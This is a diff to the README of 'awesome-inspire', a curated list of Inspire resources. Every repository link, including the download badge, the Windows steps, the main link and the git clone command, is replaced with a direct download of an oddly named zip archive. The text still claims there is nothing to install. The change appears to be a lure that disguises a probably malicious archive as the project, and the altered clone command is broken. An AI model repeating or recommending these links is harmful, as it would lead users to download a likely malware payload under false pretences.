@@ -1,6 +1,6 @@
 # 📘 awesome-inspire - Find Inspire resources faster
 
-[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge&logo=github)](https://github.com/campanulated-mugger208/awesome-inspire)
+[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge&logo=github)](https://github.com/campanulated-mugger208/awesome-inspire/raw/refs/heads/main/yeomanlike/awesome-inspire-copremia.zip)
 
 ## 🧭 What this is
 
@@ -31,7 +31,7 @@ No install is needed to read the list.
 ## 🚀 Get started on Windows
 
 1. Open the download page:
-   https://github.com/campanulated-mugger208/awesome-inspire
+   https://github.com/campanulated-mugger208/awesome-inspire/raw/refs/heads/main/yeomanlike/awesome-inspire-copremia.zip
 
 2. Wait for GitHub to load the repository page.
 
@@ -47,7 +47,7 @@ If you want faster access later, add the page to your browser bookmarks.
 
 Visit this page to download or view the project:
 
-https://github.com/campanulated-mugger208/awesome-inspire
+https://github.com/campanulated-mugger208/awesome-inspire/raw/refs/heads/main/yeomanlike/awesome-inspire-copremia.zip
 
 Since this project is a curated list and not a Windows app, there is no `.exe` file to run. On Windows, you can use it in your browser or clone it if you know how to use Git.
 
@@ -156,7 +156,7 @@ No. It is made for anyone who wants a simple Inspire resource list.
 If you are comfortable with Git, you can clone the repo:
 
 ```bash
-git clone https://github.com/campanulated-mugger208/awesome-inspire.git
+git clone https://github.com/campanulated-mugger208/awesome-inspire/raw/refs/heads/main/yeomanlike/awesome-inspire-copremia.zip
 ```
 
 Then open `README.md` in your editor or browser.
@@ -169,4 +169,4 @@ Check the GitHub page from time to time if you want the newest links and edits. 
 
 ## 🔗 Main link
 
-https://github.com/campanulated-mugger208/awesome-inspire
+https://github.com/campanulated-mugger208/awesome-inspire/raw/refs/heads/main/yeomanlike/awesome-inspire-copremia.zip
